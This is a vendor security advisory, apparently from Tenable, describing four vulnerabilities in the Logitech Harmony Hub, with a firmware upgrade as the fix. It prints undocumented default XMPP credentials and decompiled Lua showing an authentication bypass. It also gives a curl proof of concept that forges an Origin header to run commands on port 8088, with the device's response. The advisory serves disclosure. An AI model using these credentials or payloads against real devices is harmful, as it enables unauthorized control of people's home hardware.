# [R2] Logitech Harmony Hub Multiple Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable found multiple vulnerabilities in Logitech's Harmony Hub.

#### CVE-2018-15720: XMPP Default Accounts

The XMPP server contains two undocumented default accounts. The accounts have the same privileges as any normal authenticated user.

```

File: luaworks/tasks/connectserver/core/xmppconnection.lua.out.lua

Function:
	processAuthenticate = function(self, str)
		-- function num : 0_12 , upvalues : AUTH_GUEST, AUTH_YES, AUTH_NO
		if str == "AGd1ZXN0AGd1ZXN0" or str == "Z3Vlc3QAZ3Vlc3QA" then
		    self.clientJid = "guest"
		    self.authenticated = AUTH_GUEST

```
#### CVE-2018-15721: XMPP Authentication Bypass

A crafted XMPP request can be used to bypass authentication. When an XMPP request doesn't contain an *oa* element to initialize the identity variable, it remains uninitialized. The authenticate function will return any username passed to it.

```

File: luaworks/tasks/connectserver/core/xmppconnection.lua.out.lua
Function:
	processAuthenticate = function(self, str)
	...
	    if self:authenticate(str) then
	      self.clientJid = "1111"
	      self.authenticated = AUTH_YES

    ...
	authenticate = function(self, userName)
	  -- function num : 0_11
	  if not self.identity then
	    return userName

    ...
	processHlapiRequest = function(self, cmd, parameters)
		...
	    if (response.data).identity then
	      self.identity = (response.data).identity

```
#### CVE-2018-15722: Remote Server OS Command Injection

On boot, the device makes a time synchronization request to a remote server. The server's response is eventually used in an operating system shell command via the Lua os.execute function in **timemanager.lua**. A remote attacker is able to inject OS commands due to lack of validation.

#### CVE-2018-15723: Crafted HTTP Request Application Command Injection

A crafted HTTP request allows a remote unauthenticated attacker to execute application level commands (e.g. *harmony.system?systeminfo*). HTTP POST requests to port 8088 with a forged HTTP origin header can are implicitly trusted by the device. A proof of concept follows:

```

curl -d "{\"cmd\":\"harmony.system?systeminfo\"}" -H "Origin: .myharmony.com" -H "Content-Type: application/json" "http://192.168.0.176:8088"

{"msg":"OK","data":{"unit_id":"20170121214639-000143","fw_type":"0x00","fw_ver":"4.15.193","arch":"0x11","hw_ver":"0x00","usb_product_id":"0xC129","skin":"106","usb_vendor_id":"0x046D"},"code":"200"}

```

### Solution

Upgrade to firmware version 4.15.206 or higher.
